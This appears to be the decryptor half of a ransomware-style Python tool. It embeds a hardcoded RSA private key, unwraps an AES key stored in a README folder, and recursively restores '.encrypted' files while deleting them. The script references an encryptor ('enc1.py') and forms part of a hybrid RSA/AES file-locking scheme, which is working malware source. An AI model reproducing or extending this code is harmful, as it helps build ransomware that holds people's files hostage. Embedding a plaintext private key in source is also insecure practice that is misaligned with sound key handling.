from Crypto.Cipher import AES, PKCS1_OAEP
import os, random, sys
import struct
from Crypto.PublicKey import RSA

def decrypt(key,path):
    os.chdir(path)
    files=os.listdir('.')
    for fil in files:
        if os.path.isdir(f"{fil}"):
            path1=f"{path}/{fil}"
            decrypt(key,path1)
            os.chdir(f"{path}")
            continue
        filn = fil.split('.')
        if filn[1]=='encrypted' and fil!='enc1.py' and fil!='key.key':
            input_file = f"{fil}"
            fi=filn[0].split('_')
            f=fi[-1:]
            ff=f[0]
            fo=fi[:(len(fi)-1)]
            filnam = '_'.join(fo)
            #print(filnam)
            output_file = f"{filnam}.{ff}"

            with open(input_file,'rb') as fin:
                fsz = struct.unpack('<Q', fin.read(struct.calcsize('Q')))[0]
                iv = fin.read(16)
                chunksize = 2048
                aes = AES.new(key, AES.MODE_CBC, iv)

                with open(output_file, 'wb') as fout:
                    while True:
                        chunk = fin.read(chunksize)
                        if len(chunk) == 0:
                            break
                        fout.write(aes.decrypt(chunk))

                    fout.truncate(fsz)

            os.remove(f"{fil}")

os.chdir('README')

file = open('key.key', 'rb')
enc_key = file.read() # The key will be type bytes
file.close()

file = open('key1.key', 'rb')
key1_enc = file.read() # The key will be type bytes
file.close()

spriv=b'''-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA5Q5nmx7aHoCMJMsyCxHisKBEH8N27QQE56X2zfNyWDJR4WuO
wsYkJpP/UkCqcpJCs6f/QS8GmwU8P4peWPZ1HYqYi12LQhPJfWemVLM5JlxuRw5a
S1upD13i1xyMsosw80iRBaYev5VkModv8flvWVte78NcmtQfiC0bU/BgSgRGegaH
+PORgeHfLi4vaEmiaMTFpzuy6R+u9dtjGGmgbEZN23bccs0hfqCimbJ8zaWF4cZb
iZpZJNKvaQ7pLML8qNu5bVV5T+f3YeW/jf92XLgTQbt/fgXXcu0Oyfkt8PWxbd6s
8jSGZGYVMyRk2t807BMj7nlHE8B7qc2xR+DPmwIDAQABAoIBAA7mQ/kEJb4MMJGI
IiY0MKG6mxPR3B+IvmTvF8HHzy1LgKYAIBYtW1ajE92e1TeEqhATonfz/iMBUSz0
7DQvO+kDBe8y04cl0Fp27ovd6J7FLmsy1M7IFJQqUEIb2k8W3MVGeCB88M0Xg6AB
zVdZGVQfrGo+M/ziRXbPMFLidPD7fLCDlXb3qPnZSunlXzZcdEQwloN+BjrSsgsl
XyccD3YTPNeRofaku1rVkudw5ddZG0okYU7aPHq0jz4Rx7yNeQgmCNCTILWgEWeK
npotdvBTaCuadx+c7c1A1MRy6fo4EqMfm/wxwiQDcKEpG7vlfMX9qFv3UYzc8QV4
oWCocUECgYEA6fxfPfFMqQ5aOFJi2dFB3eZ/LeBblNcfsBAJZnxrPRJDEwCsHhUc
u+JjNsVP61JeHNQDCs/wzyQZYCBEGx+J9jEvMbUDsPsOZ8BBaOda7grspqYuG9xj
fRqUIQB9Qm4WguTnultW37SVtSV89YTqRp7vvJ0GtnXBpJ9m1J0fPeECgYEA+ptN
dAhs120WlsDfvtEACxdExRxqrFd780HavIFgx0Tz3JXS/69/ZRiNELr+vt2liHIh
B2NlPY+GNXwDzjY5tfYEv4gKmrUBflwpKfwXlZp/EaD6lFQau0Ho/c3TsJe06gEc
9CmWWYi+3JB2UauEWpsPNIl+uXD8vsFHpOv7pPsCgYEAzWmvOzPg9vEQpy08drhM
OMAnmmDCRXJt8STC++PySRUFKWOHtokWRqNCMk0aEh6nXGuLmCxg3Zh1ZnwtDhqs
BSO8qMieyvo79T1ErxGcNCoHA24UQIVEGgoBTM+fJ3h57sOB44pYQ9/HJdYZU3ky
KnlRQaYgxIGwVBNUNQcS7EECgYAQ+WnynQt6P/pStbex/ggJuEbBLx6Ok9JidKhz
MjQy6xm1bDSBewqe912+r1vH481tg4V3MaVO2STXBJJhakzYZVSHAJjvR6lVPLrR
DDEwwekvcX7ngxbYbitw3XskL/JiEzc51oNHhzqeR+6rs3lghbYu8c0ylFOaPA81
PYKq9wKBgA7mzcORhagZ1DN71jwvI1AgLBIcxWOExmvy/Gv+nYXA9vtFILmtqOt5
OX3DnUPK2tgbdeFEY4ZaUFnQeHxE0CzUZjKjde790Lj/9rl1WEg4yxxB/mnDvJHI
UOR/tMJhXmGDdwbMo+Jua5eDbkhnCJd4U5lfyAdWrlAK2ZUejL+F
-----END RSA PRIVATE KEY-----'''
keypub = RSA.import_key(spriv)
cipher_rsa1 = PKCS1_OAEP.new(keypub)
key1 = cipher_rsa1.decrypt(key1_enc)


with open("private_pem.encrypted",'rb') as fin:
    fsz = struct.unpack('<Q', fin.read(struct.calcsize('Q')))[0]
    iv1 = fin.read(16)
    chunksize = 2048
    aes1 = AES.new(key1, AES.MODE_CBC, iv1)

    with open("private.pem", 'wb') as fout:
        while True:
            chunk = fin.read(chunksize)
            if len(chunk) == 0:
                break
            fout.write(aes1.decrypt(chunk))

        fout.truncate(fsz)

os.remove("private_pem.encrypted")



private_key = RSA.import_key(open("private.pem").read())
cipher_rsa = PKCS1_OAEP.new(private_key)
key = cipher_rsa.decrypt(enc_key)

os.chdir('..')

path=os.getcwd()
decrypt(key,path)